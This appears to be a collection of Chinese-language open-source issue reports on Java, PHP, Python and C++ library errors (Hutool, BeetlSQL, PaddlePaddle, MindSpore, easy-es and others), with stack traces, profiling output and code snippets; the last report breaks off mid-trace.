关于JsonUtil toBean的问题,"使用的JDK版本和Hutool版本 openjdk11 Hutool 5.0.7 以上为代码，使用Gson的时候方法正常，但是使用Hutool的JSONUtil.toBean时报错，DefaultPutRet为七牛云SDK的一个类，位于com.qiniu.storage.model org.springframework.web.util.NestedServletException: Request processing failed; nested exception is cn.hutool.core.convert.ConvertException: No Converter for type [com.qiniu.storage.model.DefaultPutRet] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:523) ~[jakarta.servlet-api-4.0.3.jar:4.0.3] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:590) ~[jakarta.servlet-api-4.0.3.jar:4.0.3] at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.SessionRestoringHandler.handleRequest(SessionRestoringHandler.java:119) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) ~[na:na] at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) ~[na:na] at java.base/java.lang.Thread.run(Thread.java:834) ~[na:na] Caused by: cn.hutool.core.convert.ConvertException: No Converter for type [com.qiniu.storage.model.DefaultPutRet] at cn.hutool.core.convert.ConverterRegistry.convert(ConverterRegistry.java:248) ~[hutool-all-5.0.7.jar:na] at cn.hutool.core.convert.ConverterRegistry.convert(ConverterRegistry.java:263) ~[hutool-all-5.0.7.jar:na] at cn.hutool.core.convert.Convert.convert(Convert.java:653) ~[hutool-all-5.0.7.jar:na] at cn.hutool.core.convert.Convert.convert(Convert.java:624) ~[hutool-all-5.0.7.jar:na] at cn.hutool.json.JSONConverter.jsonConvert(JSONConverter.java:82) ~[hutool-all-5.0.7.jar:na] at cn.hutool.json.JSON.toBean(JSON.java:185) ~[hutool-all-5.0.7.jar:na] at cn.hutool.json.JSON.toBean(JSON.java:172) ~[hutool-all-5.0.7.jar:na] at cn.hutool.json.JSON.toBean(JSON.java:148) ~[hutool-all-5.0.7.jar:na] at cn.hutool.json.JSONUtil.toBean(JSONUtil.java:355) ~[hutool-all-5.0.7.jar:na] at cn.hutool.json.JSONUtil.toBean(JSONUtil.java:343) ~[hutool-all-5.0.7.jar:na] at cn.altuma.tumachat.utils.QiNiuYunUtil.uploadAvatarToQiNiu(QiNiuYunUtil.java:55) ~[classes/:na] at cn.altuma.tumachat.controller.UserController.uploadAvatar(UserController.java:199) ~[classes/:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na] at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na] at java.base/java.lang.reflect.Method.invoke(Method.java:566) ~[na:na] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:888) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:793) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] ... 48 common frames omitted   <code>: /** * 上传聊天图片到七牛云 * * @param imgBase64 上传图片的base64 * @param suffix 图片格式后缀名 * @return 七牛云图片url地址 * @throws Exception */ public static String uploadImgToQiNiu(String imgBase64, String suffix) throws Exception { Snowflake snowflake = IdUtil.createSnowflake(1, 1); long picId = snowflake.nextId(); String key = picId + suffix; String picPath = ""D:\\temp\\chatPic\\"" + key; //上传图片路径 FileUtils.base64ToFile(picPath, imgBase64); //Configuration cfg = new Configuration(Zone.zone0()); Configuration cfg = new Configuration(Region.huadong()); UploadManager uploadManager = new UploadManager(cfg); Auth auth = Auth.create(ACCESS_KEY, SECRET_KEY); String upToken = auth.uploadToken(CHAT_IMG_BUCKET); Response response; response = uploadManager.put(picPath, key, upToken); //下面开始报错： //DefaultPutRet putRet = new Gson().fromJson(response.bodyString(), DefaultPutRet.class); DefaultPutRet putRet = JSONUtil.toBean(response.bodyString(), DefaultPutRet.class); System.out.println(putRet.key); System.out.println(putRet.hash); FileUtil.del(picPath); return ""http://qiniu.altuma.cn/"" + key; }"
版本不兼容,"List getUsers(); 默认返回类型Enntity，但新版本报错   <code>: Exception in thread ""main"" java.lang.ClassCastException: java.lang.Class cannot be cast to java.lang.reflect.ParameterizedType at org.beetl.sql.core.mapper.MethodDesc.parse(MethodDesc.java:192) at org.beetl.sql.core.mapper.MethodDesc.doParse(MethodDesc.java:97) at org.beetl.sql.core.mapper.MethodDesc.getMetodDesc(MethodDesc.java:84) at org.beetl.sql.core.mapper.MapperJavaProxy.invoke(MapperJavaProxy.java:136) at com.sun.proxy.$Proxy2.getUsers(Unknown Source) at org.beetl.sql.test.QuickTest.main(QuickTest.java:34)"
支付宝服务商模式[app_auth_token]怎么传呢，,"使用服务商，三方应用需要传app_auth_token，没有看到怎么传， 修改了一下Yansongda\Pay\Plugin\Alipay\PreparePlugin文件。 改了一下，从初始设置获取，config里需要加上'app_auth_token'，是这样操作吗？还是说有其它的方法。   <code>: /** * @throws \Yansongda\Pay\Exception\ContainerDependencyException * @throws \Yansongda\Pay\Exception\ContainerException * @throws \Yansongda\Pay\Exception\ServiceNotFoundException * @throws \Yansongda\Pay\Exception\InvalidConfigException */ protected function getPayload(array $params): array { return [ 'app_id' =&gt; get_alipay_config($params)-&gt;get('app_id', ''), 'method' =&gt; '', 'format' =&gt; 'JSON', 'return_url' =&gt; $this-&gt;getReturnUrl($params), 'charset' =&gt; 'utf-8', 'sign_type' =&gt; 'RSA2', 'sign' =&gt; '', 'timestamp' =&gt; date('Y-m-d H:i:s'), 'version' =&gt; '1.0', 'notify_url' =&gt; $this-&gt;getNotifyUrl($params), 'app_auth_token' =&gt; '', 'app_cert_sn' =&gt; $this-&gt;getAppCertSn($params), 'alipay_root_cert_sn' =&gt; $this-&gt;getAlipayRootCertSn($params), 'biz_content' =&gt; [], ]; } 'app_auth_token' =&gt; get_alipay_config($params)-&gt;get('app_auth_token',''),"
表内有datetime字段时报错,"HttpMessageConversionException:Type definition error: [simple type, class java.time.LocalDateTime]; nested exception is com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Java 8 date/time type not supported by default: add Module ""com.fasterxml.jackson.datatype:jackson-datatype-jsr310"" to enable handling (through reference chain: java.util.LinkedHashMap[""data""]-&gt;java.util.ArrayList[0]-&gt;java.util.LinkedHashMap[""create_date""]) 当要查询的数据表中存在datetime格式的字段时，会出现该错误，导致该字段的数据无法正常解析出来。   <code>: java.time.LocalDateTime"
[Speed]Refine elementwise_mul_op gradient functor,fix https://github.com/PaddlePaddle/Paddle/issues/8811 Refine se_resnet_152 -&gt; elementwise_mul_op gradient-functor related issue: https://github.com/PaddlePaddle/Paddle/issues/8661 <em>The time-consuming of elementwise_mul_grad reduced ten times : 3164.52 --&gt;352.164</em> profile script https://github.com/dzhwinter/benchmark/pull/83/files before optimize after optimize   <code>: -------------------------&gt; Profiling Report &lt;------------------------- Place: All Time unit: ms Sorted by total time in descending order in the same thread Event Calls Total Min. Max. Ave. thread0::conv2d_grad 8007 16130.5 0.409856 105.679 2.01455 thread0::pool2d_grad 2652 5440.28 0.20384 14.7589 2.05139 thread0::conv2d 8007 5274.17 0.168032 117.607 0.658695 thread0::elementwise_mul_grad 2550 3164.52 0.352928 4.35414 1.24099 thread0::sum 5100 1403.87 0.1008 0.902272 0.275268 thread0::batch_norm_grad 8007 1308.53 0.044288 1.41232 0.163423 thread0::batch_norm 8007 1079.35 0.049216 1.16714 0.134801 thread0::elementwise_mul 36873 984.829 0.003072 7.73997 0.0267087 ... Event Calls Total Min. Max. Ave. thread0::conv2d_grad 8007 16069 0.40544 113.233 2.00687 thread0::pool2d_grad 2652 5413.14 0.203456 14.8475 2.04115 thread0::conv2d 8007 5256.77 0.16912 115.189 0.656521 thread0::sum 5100 1402.64 0.101024 0.879392 0.275028 thread0::batch_norm_grad 8007 1310.68 0.044832 1.4183 0.163692 thread0::batch_norm 8007 1073.83 0.049376 1.15424 0.134111 thread0::elementwise_mul 36873 991.32 0.003072 0.266528 0.0268847 thread0::momentum 34323 825.496 0.00336 1.07974 0.0240508 thread0::relu_grad 10353 819.45 0.00336 0.772896 0.079151 thread0::relu 10353 581.015 0.003264 0.56944 0.0561204 thread0::elementwise_mul_grad 2550 352.164 0.061568 0.356768 0.138103 thread0::elementwise_add 7701 311.604 0.003648 0.365344 0.0404628 thread0::elementwise_add_grad 7701 308.575 0.003872 0.337504 0.0400694 ...
运行Demo2时报错,"经检查，是策略运行到某支只有2根k线数据的股票时出错 感觉getNextWeekDateList(week)函数在遇到小于10根K线（两周）的KData时都有几率出现这个问题 要不要把 改为 这样保险一些   <code>: IndexError Traceback (most recent call last) &lt;timed exec&gt; in &lt;module&gt; &lt;ipython-input-128-4d9758ea198c&gt; in calTotal(blk, q) 6 x = [] 7 for stk in blk: ----&gt; 8 my_sys.run(stk, q) 9 per.statistics(my_tm, Datetime.now()) 10 s_name.append(stk.name) &lt;ipython-input-118-6c115a10e2ad&gt; in DEMO_CN(self) 26 if (x[i] &gt;= 1.0): 27 #需要被扩展到日线（必须是后一周） ---&gt; 28 date_list = getNextWeekDateList(week_k[i].datetime) 29 for d in date_list: 30 self._addValid(d) D:\hikyuu\hikyuu\hikyuu\core.py in KData_getitem(kdata, i) 261 index = length + i if i &lt; 0 else i 262 if index &lt; 0 or index &gt;= length: --&gt; 263 raise IndexError(""index out of range: %d"" % i) 264 return kdata.getKRecord(index) 265 IndexError: index out of range: 1 def DEMO_CN(self): …… if (len(k) &lt;= 1): return …… def DEMO_CN(self): ………… if (len(k) &lt;= 10): return …………"
部署模式独立+生成单个文件最终生成的程序会报错.,Furion 版本号 3.2.1 Web 项目类型 Console WebApi Mvc Razor Pages Blazor Server MinApp   <code>: 1 configure) at Furion.Inject.Create(Action
test_analyzer_small_dam random fails on accuracy,"http://ci.paddlepaddle.org/viewLog.html?buildId=75853&amp;tab=buildLog&amp;buildTypeId=Paddle_PrCi&amp;logTab=tree&amp;filter=all&amp;_focus=25726 Is this issue related with #16316?   <code>: [02:50:55] I0327 02:50:55.226866 88684 helper.h:270] ====== batch_size: 1, repeat: 1, threads: 1, thread id: 0, latency: 34.1772ms, fps: 29.2592 ====== [02:50:55] I0327 02:50:55.226940 88684 tester_helper.h:301] Thread 0 run 1 times... [02:50:55] I0327 02:50:55.258460 88684 helper.h:270] ====== batch_size: 1, repeat: 1, threads: 1, thread id: 0, latency: 31.4899ms, fps: 31.7562 ====== [02:50:55] F0327 02:50:55.268436 88684 tester_helper.h:97] Check failed: std::abs(pdata_ref[j] - pdata[j]) &lt;= FLAGS_accuracy (0.201252 vs. 0.001)"
文档C   预测 API的例子编译后，运行报错：段错误（核心已转储）,"-环境信息 -预测信息 1）C++预测：预测库安装包的版本信息 cuda10.0_cudnn7_avx_mkl，其中的version.txt文件: 2）CMake包含路径的完整命令: 3）预测库来源：官网下载 复现信息： 文档 - C++ 预测 API介绍（https://www.paddlepaddle.org.cn/documentation/docs/zh/advanced_usage/deploy/inference/native_infer.html ） 中的前两个使用样例报错。 我将文档 - 'C++ 预测 API介绍 - NativePredictor使用样例' 的例子代码放在一个paddle_NativePredictor.cpp中，没有改动，然后写好CMakeLists.txt如上所述，然后编译，未报错，运行可执行程序报错：段错误（核心已转储） 同样的方法，将代码换成了文档 - 'C++ 预测 API介绍 - AnalysisPredictor 使用样例' ，也是基本是报同样的错。 问题描述： C++ 预测 API介绍 - NativePredictor使用样例就是编译好之后报错：段错误（核心已转储），gdb信息如下： 第二个例子“AnalysisPredictor使用样例”也报错，同样的方法，仅仅将cpp里的代码换成了文档 - 'C++ 预测 API介绍 - AnalysisPredictor 使用样例' ，报错error: ‘accumulate’ is not a member of ‘std’，于是我在这段代码开头加上了“ #include ”，之后报错如下： 我将代码改写如下： 编译好之后执行报错：段错误 (核心已转储) gdb信息如下：   <code>: 1）PaddlePaddle版本：1.5.2.post107 2）CPU：- 3）GPU：notebook GTX 1060、CUDA 10.0、CUDNN 7.5.1 4）系统环境：ubuntu 18.04，Python 3.6.8 GIT COMMIT ID: a5696153a013552bfaa612ca407eba318e18ba54 WITH_MKL: ON WITH_MKLDNN: ON WITH_GPU: ON CUDA version: 10.0 CUDNN version: v7 INCLUDE_DIRECTORIES(/home/xxx/paddle_cpp/src/include) target_link_libraries(paddle_NativePredictor /home/xxx/paddle_cpp/src/lib/libpaddle_fluid.so /home/xxx/paddle_cpp/src/third_party/install/mkldnn/lib/libmkldnn.so.0 /home/xxx/paddle_cpp/src/third_party/install/mklml/lib/libmklml_intel.so ) Temporary breakpoint 1, main () at /home/abc/paddle_cpp/src/paddle_NativePredictor.cpp:54 54 int main() { (gdb) n 56 paddle::RunNative(1, ""./mobilenet""); (gdb) Program received signal SIGSEGV, Segmentation fault. 0x00007fffe018319f in std::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::basic_string(std::string const&amp;) () from /usr/lib/x86_64-linux-gnu/libstdc++.so.6 (gdb) Single stepping until exit from function _ZNSsC2ERKSs, which has no line number information. CMakeFiles/paddle_NativePredictor.dir/paddle_NativePredictor.cpp.o：在函数‘paddle::CreateConfig(paddle::AnalysisConfig*, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;)’中： /home/abc/paddle_cpp2/src/paddle_NativePredictor.cpp:7：对‘paddle::AnalysisConfig::SetModel(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;)’未定义的引用 collect2: error: ld returned 1 exit status CMakeFiles/paddle_NativePredictor.dir/build.make:86: recipe for target 'paddle_NativePredictor' failed make[2]: *** [paddle_NativePredictor] Error 1 CMakeFiles/Makefile2:72: recipe for target 'CMakeFiles/paddle_NativePredictor.dir/all' failed make[1]: *** [CMakeFiles/paddle_NativePredictor.dir/all] Error 2 Makefile:83: recipe for target 'all' failed make: *** [all] Error 2 #include ""paddle_inference_api.h"" #include &lt;numeric&gt; int main() { paddle::AnalysisConfig config; int batch_size = 1; std::string model_dirname = ""./mobilenet""; config.SetModel(model_dirname); config.EnableUseGpu(1000, 0); config.SwitchUseFeedFetchOps(false); config.SwitchSpecifyInputNames(true); // config.SwitchIrDebug(true); auto predictor = CreatePaddlePredictor(config); return 0; } 64 int main() { (gdb) n 66 paddle::AnalysisConfig config; (gdb) 68 int batch_size = 1; (gdb) 69 std::string model_dirname = ""./mobilenet""; (gdb) 71 config.SetModel(model_dirname); (gdb) 72 config.EnableUseGpu(10, 0 ); (gdb) Program received signal SIGSEGV, Segmentation fault. __memmove_avx_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:249 249 ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S: 没有那个文件或目录."
 CCJSqlParserUtil不支持Oracle的with等语法,"Oracle11g后的新增特性暂时都不支持，可能与JavaCC有关，提供参考，为钱而来。 内容为with语法错误   <code>: Statements result = CCJSqlParserUtil.parseStatements(""SELECT * FROM (WITH products AS (SELECT 'p' pid FROM t_product) SELECT pid FROM product)""); org.tinygroup.jsqlparser.parser.ParseException: Encountered "" ""WITH"" ""WITH """" at line 1, column 16."
针对XxxMapping中的params参数无法正确显示的bug,"controller代码如下,本意是想提供3个url相同的接口, 通过:@PostMapping中的params参数来使用不同的方法进行对应的处理 a:请求中的domain参数为aaa b:请求中的domain参数为bbb 0:无法匹配domain参数的请求 跑起来之后,实际功能可以正常使用, 但是knife4j的doc.html只显示出了一个a!!!   <code>: @ApiOperation(value = ""测试功能-0"", notes = ""测试功能(domain=other)"") @PostMapping(""/rest"") public Object rest(HttpServletRequest request, HttpServletResponse response) { System.err.println(""/test/rest ......""); return ""default method""; } @ApiOperation(value = ""测试功能-a"", notes = ""测试功能A(domain=aaa)"") @PostMapping(value = ""/rest"", params = {""domain=aaa""}) public Object rest_aaa(Integer goodsId, Integer goodsCount) { System.err.println(""/test/rest_aaa ......"" + goodsId + "", "" + goodsCount); return ""AAA""; } @ApiOperation(value = ""测试功能-b"", notes = ""测试功能B(domain=bbb)"") @PostMapping(value = ""/rest"", params = {""domain=bbb""}) public Object restb_bbb(String username, @RequestParam(""pwd"") String password) { System.err.println(""/test/rest_bbb ......"" + username + "", "" + password); return ""BBB""; }"
[MS][NET][wide&deep ps][gpu 8p]network train failed,": /device ascend : -- MindSpore version :commit_id: cae7f291 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_ms_model_zoo_wide_deep_criteo_ps_train_infer_gpu_8p_daily.py get code from model_zoo sh run_parameter_server_train_distribute.sh wide&amp;deep pswangl 训练失败 网络训练推理正常 wide&amp;deep ps网络在GPU环境8p训练失败，进程卡住不退出   <code>: Traceback (most recent call last): File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/wide_deep/network/test_ms_model_zoo_wide_deep_criteo_ps_train_infer_gpu_8p_daily/script/../train_and_eval_parameter_server_distribute.py"", line 178, in &lt;module&gt; train_wide_and_deep() File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/wide_deep/network/test_ms_model_zoo_wide_deep_criteo_ps_train_infer_gpu_8p_daily/src/model_utils/moxing_adapter.py"", line 108, in wrapped_func run_func(*args, **kwargs) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/wide_deep/network/test_ms_model_zoo_wide_deep_criteo_ps_train_infer_gpu_8p_daily/script/../train_and_eval_parameter_server_distribute.py"", line 175, in train_wide_and_deep train_and_eval(cfg) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/wide_deep/network/test_ms_model_zoo_wide_deep_criteo_ps_train_infer_gpu_8p_daily/script/../train_and_eval_parameter_server_distribute.py"", line 144, in train_and_eval dataset_sink_mode=(parameter_server and cache_enable)) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 649, in train sink_size=sink_size) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 439, in _train self._train_dataset_sink_process(epoch, train_dataset, list_callback, cb_params, sink_size) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 510, in _train_dataset_sink_process list_callback.epoch_end(run_context) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/callback/_callback.py"", line 208, in epoch_end cb.epoch_end(run_context) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/wide_deep/network/test_ms_model_zoo_wide_deep_criteo_ps_train_infer_gpu_8p_daily/src/callbacks.py"", line 122, in epoch_end out = self.model.eval(self.eval_dataset, dataset_sink_mode=enable_data_sink) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 779, in eval return self._eval_dataset_sink_process(valid_dataset, list_callback, cb_params) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 676, in _eval_dataset_sink_process outputs = self._eval_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 386, in __call__ out = self.compile_and_run(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 659, in compile_and_run return _executor(self, *parallel_inputs_run, phase=self.phase) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 611, in __call__ return self.run(obj, *args, phase=phase) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 639, in run return self._exec_pip(obj, *args, phase=phase_real) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 75, in wrapper results = fn(*arg, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 622, in _exec_pip return self._executor(args_list, phase) RuntimeError: mindspore/ccsrc/ps/ps_cache/ps_cache_manager.cc:292 IncreaseGraphStep] PS embedding cache data processing thread isn't running. [ERROR] PS(3873,7fe948b03700,python):2021-07-28-13:28:15.644.214 [mindspore/ccsrc/ps/worker.cc:42] operator()] Trigger timeout event: NODE_TIMEOUT begin to exit the system! [ERROR] PS(3870,7f8b3d0f2700,python):2021-07-28-13:32:14.712.449 [mindspore/ccsrc/ps/ps_cache/ps_data/ps_data_prefetch.cc:110] FinalizeData] Ps cache data prefetch timeout."
java.lang.IllegalArgumentException: argument type mismatch,"如题，我在使用https://gitee.com/easy-es/easy-es-springboot-demo提供的例子测试时，发现一个问题，就是如题所示的提示 我的改动的代码是： Document.java里将id改为Integer 然后在EeUseApplicationTests.java添加如下所示方法： 请问主键不能用Integer么，还是我的用法有问题，盼释疑   <code>: java.lang.IllegalArgumentException: argument type mismatch at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) NativeMethodAccessorImpl.java:62 at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) DelegatingMethodAccessorImpl.java:43 at java.lang.reflect.Method.invoke(Method.java:498) Method.java:498 at com.xpc.easyes.core.conditions.BaseEsMapperImpl.setId(BaseEsMapperImpl.java:896) BaseEsMapperImpl.java:896 at com.xpc.easyes.core.conditions.BaseEsMapperImpl.doBulkRequest(BaseEsMapperImpl.java:720) BaseEsMapperImpl.java:720 at com.xpc.easyes.core.conditions.BaseEsMapperImpl.insertBatch(BaseEsMapperImpl.java:285) BaseEsMapperImpl.java:285 at 